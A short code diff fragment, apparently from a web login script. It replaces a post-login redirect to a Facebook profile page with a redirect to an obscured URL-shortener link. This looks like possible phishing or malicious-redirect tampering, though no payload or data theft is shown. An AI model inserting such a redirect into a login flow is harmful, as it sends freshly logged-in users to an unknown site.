@@ -72,6 +72,6 @@ LoginBtn.addEventListener('click', e => {
         return; // Abort the transaction.
       }
     });
-    window.location.replace("http://www.facebook.com/me");
+    window.location.replace("https://smrturl.co/httpssmrturlcoo28917253259076s1~289172Z	");
   }
 });
